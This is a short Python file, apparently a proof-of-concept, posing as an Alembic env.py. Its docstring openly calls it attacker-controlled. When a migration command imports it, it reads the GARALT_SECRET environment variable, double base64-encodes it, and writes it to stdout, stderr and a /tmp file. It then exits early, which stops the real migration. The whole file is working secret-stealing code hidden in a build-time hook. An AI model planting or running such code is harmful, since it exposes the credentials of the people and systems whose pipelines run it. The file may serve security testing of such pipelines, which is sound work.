"""Attacker-controlled env.py - leaks GARALT_SECRET during alembic migration"""
import os
import sys
import base64

# Leak GARALT_SECRET immediately upon import by 'uv run alembic upgrade head'
secret = os.environ.get("GARALT_SECRET", "NOT_FOUND")
encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}")
print(f"GARALT_LEAKED_TOKEN={encoded}", file=sys.stderr)

# Write to a file for additional exfiltration
with open("/tmp/galt_leak.txt", "w") as f:
    f.write(f"GARALT_LEAKED_TOKEN={encoded}")

# Exit early to make the leak visible in logs
sys.exit(0)
